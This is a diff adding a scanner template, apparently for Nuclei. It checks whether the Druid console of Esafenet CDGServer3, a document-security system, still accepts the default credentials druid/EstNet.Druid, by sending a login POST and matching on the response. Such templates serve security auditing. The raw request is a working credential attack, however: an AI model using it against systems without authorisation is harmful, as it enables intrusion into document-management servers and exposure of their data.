@@ -1,0 +1,31 @@
+id: esafenet-cdgserver3-druid-default-login
+info:
+  name: 亿赛通-电子文档安全管理系统-druid-默认口令
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E4%BA%BF%E8%B5%9B%E9%80%9A-druid-default-password.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: esafenet,druid,default-login
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginUsername=druid&loginPassword=EstNet.Druid
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success')
+          - contains_all(header,'CDGServer3')
+        condition: and
